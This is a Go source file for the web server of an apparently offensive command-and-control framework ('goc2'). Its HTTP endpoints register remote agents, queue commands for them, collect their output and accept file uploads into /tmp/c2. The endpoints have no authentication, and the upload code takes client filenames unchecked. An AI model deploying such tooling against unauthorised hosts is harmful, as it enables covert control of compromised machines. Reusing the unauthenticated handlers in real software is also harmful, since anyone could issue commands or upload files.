package web

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"time"

	"github.com/globalsign/mgo/bson"
	"github.com/grines/goc2/internal/app/api"
	"github.com/julienschmidt/httprouter"
)

type domainObject struct {
	ID       bson.ObjectId `bson:"_id,omitempty"`
	Type     string
	Hostname string
	Domain   string
	Private  bool
	Ipv4     string
}

//Start the Web Server
func Start(port string) {
	status := rawConnect("127.0.0.1", "27017")
	if status == false {
		fmt.Println("Mongo is not running")
		os.Exit(0)
	}
	router := httprouter.New()

	router.ServeFiles("/files/*filepath", http.Dir("/tmp/c2"))

	//Main Entry
	router.POST("/api/cmd/files", apiFiles)
	router.GET("/api/files", apiFilesList)
	router.POST("/api/cmd/update", apiCmdUpdate)
	router.POST("/api/cmd/update/output", apiCmdUpdateOut)
	router.POST("/api/cmd/new", apiCmdNew)

	//Main Entry
	router.GET("/api/test", apiTest)

	//Agents Endpoints
	router.GET("/api/agents", apiAgents)
	router.GET("/api/agent/:agent", apiAgent)
	router.POST("/api/agent/update", apiAgentsUpdate)
	router.POST("/api/agent/create", apiAgentsCreate)
	router.GET("/agents/", redirect)

	//commands Endpoints
	router.GET("/api/cmds/:name", apiCmds)
	router.GET("/api/cmd/output/:agent/:cmdid", apiCmdsOut)
	router.GET("/cmds/", redirect)

	fmt.Printf("Starting server at port " + port)
	if err := http.ListenAndServe(":"+port, router); err != nil {
		log.Fatal(err)
	}
}

func redirect(w http.ResponseWriter, r *http.Request, ps httprouter.Params) {

	http.Redirect(w, r, "/", 301)
}

func apiFiles(w http.ResponseWriter, r *http.Request, ps httprouter.Params) {
	w.Header().Set("Content-Type", "multipart/form-data")
	if err := r.ParseForm(); err != nil {
		fmt.Fprintf(w, "ParseForm() err: %v", err)
		return
	}
	r.ParseMultipartForm(10 << 20)

	file, handler, err := r.FormFile("myFile")
	if err != nil {
		fmt.Println("Error Retrieving the File")
		fmt.Println(err)
		return
	}
	defer file.Close()
	fmt.Printf("Uploaded File: %+v\n", handler.Filename)
	fmt.Printf("File Size: %+v\n", handler.Size)
	fmt.Printf("MIME Header: %+v\n", handler.Header)

	// 3. write temporary file on our server
	tempFile, err := ioutil.TempFile("/tmp/c2", handler.Filename)
	if err != nil {
		fmt.Println(err)
	}
	defer tempFile.Close()
	fileBytes, err := ioutil.ReadAll(file)
	if err != nil {
		fmt.Println(err)
	}
	tempFile.Write(fileBytes)

	if err != nil {
		log.Fatalln(err)
	}

	fmt.Fprintf(w, tempFile.Name())
}

func apiCmdUpdate(w http.ResponseWriter, r *http.Request, ps httprouter.Params) {
	w.Header().Set("Content-Type", "application/x-www-form-urlencoded")
	if err := r.ParseForm(); err != nil {
		fmt.Fprintf(w, "ParseForm() err: %v", err)
		return
	}

	ID := r.FormValue("id")
	OUTPUT := r.FormValue("output")
	fmt.Println(ID)
	fmt.Println(OUTPUT)

	jsond := map[string]interface{}{
		"status": "Command Updated",
	}

	jsondata, err := json.Marshal(jsond)
	if err != nil {
		log.Fatalln(err)
	}
	fmt.Fprintf(w, string(jsondata))
	api.UpdateCMDStatus(ID, OUTPUT)
}

func apiAgentsUpdate(w http.ResponseWriter, r *http.Request, ps httprouter.Params) {
	w.Header().Set("Content-Type", "application/x-www-form-urlencoded")
	if err := r.ParseForm(); err != nil {
		fmt.Fprintf(w, "ParseForm() err: %v", err)
		return
	}

	AGENT := r.FormValue("agent")
	WD := r.FormValue("working")
	FILES := r.FormValue("files")
	fmt.Println(AGENT)
	fmt.Println(WD)

	jsond := map[string]interface{}{
		"status": "Command Updated",
	}

	jsondata, err := json.Marshal(jsond)
	if err != nil {
		log.Fatalln(err)
	}
	fmt.Fprintf(w, string(jsondata))
	api.UpdateAgentStatus(AGENT, WD, FILES)
}

func apiAgentsCreate(w http.ResponseWriter, r *http.Request, ps httprouter.Params) {
	w.Header().Set("Content-Type", "application/x-www-form-urlencoded")
	if err := r.ParseForm(); err != nil {
		fmt.Fprintf(w, "ParseForm() err: %v", err)
		return
	}

	AGENT := r.FormValue("agent")
	WD := r.FormValue("working")
	FILES := r.FormValue("files")
	fmt.Println(AGENT)
	fmt.Println(WD)

	jsond := map[string]interface{}{
		"status": "Command Updated",
	}

	jsondata, err := json.Marshal(jsond)
	if err != nil {
		log.Fatalln(err)
	}
	fmt.Fprintf(w, string(jsondata))
	api.AgentCreate(AGENT, WD, FILES)
}

func apiCmdUpdateOut(w http.ResponseWriter, r *http.Request, ps httprouter.Params) {
	w.Header().Set("Content-Type", "application/x-www-form-urlencoded")
	if err := r.ParseForm(); err != nil {
		fmt.Fprintf(w, "ParseForm() err: %v", err)
		return
	}

	ID := r.FormValue("id")
	fmt.Println(ID)

	jsond := map[string]interface{}{
		"status": "Command Updated",
	}

	jsondata, err := json.Marshal(jsond)
	if err != nil {
		log.Fatalln(err)
	}
	fmt.Fprintf(w, string(jsondata))
	api.UpdateCMDStatusOut(ID)
}

func apiCmdNew(w http.ResponseWriter, r *http.Request, ps httprouter.Params) {
	w.Header().Set("Content-Type", "application/x-www-form-urlencoded")
	if err := r.ParseForm(); err != nil {
		fmt.Fprintf(w, "ParseForm() err: %v", err)
		return
	}

	CMD := r.FormValue("cmd")
	AGENT := r.FormValue("agent")
	CMDID := r.FormValue("cmdid")
	fmt.Println(CMD)

	jsond := map[string]interface{}{
		"cmdid": "Command Updated",
	}

	jsondata, err := json.Marshal(jsond)
	if err != nil {
		log.Fatalln(err)
	}
	fmt.Fprintf(w, string(jsondata))
	api.NewCMD(CMD, AGENT, CMDID)
}

func apiAgents(w http.ResponseWriter, r *http.Request, ps httprouter.Params) {
	w.Header().Set("Content-Type", "application/json")
	d := api.GetAgents()

	fmt.Fprintf(w, "%s", string(d))
}

func apiFilesList(w http.ResponseWriter, r *http.Request, ps httprouter.Params) {
	w.Header().Set("Content-Type", "application/json")
	http.FileServer(http.Dir("/tmp"))
}

func apiCmds(w http.ResponseWriter, r *http.Request, ps httprouter.Params) {
	w.Header().Set("Content-Type", "application/json")
	d := api.GetCommands(ps.ByName("name"))

	fmt.Fprintf(w, "%s", string(d))
}

func apiCmdsOut(w http.ResponseWriter, r *http.Request, ps httprouter.Params) {
	w.Header().Set("Content-Type", "application/json")
	d := api.GetCommandsOut(ps.ByName("agent"), ps.ByName("cmdid"))

	fmt.Fprintf(w, "%s", string(d))
}

func apiAgent(w http.ResponseWriter, r *http.Request, ps httprouter.Params) {
	w.Header().Set("Content-Type", "application/json")
	d := api.GetAgent(ps.ByName("agent"))

	fmt.Fprintf(w, "%s", string(d))
}

func apiTest(w http.ResponseWriter, r *http.Request, ps httprouter.Params) {
	w.Header().Set("Content-Type", "application/json")
	json := "{\"status\": \"started\"}"
	fmt.Fprintf(w, json)
}

func rawConnect(host string, port string) bool {
	timeout := time.Second
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, port), timeout)
	if err != nil {
		fmt.Println("Connecting error:", err)
		return false
	}
	if conn != nil {
		defer conn.Close()
		fmt.Println("Opened", net.JoinHostPort(host, port))
		return true
	}
	return false
}
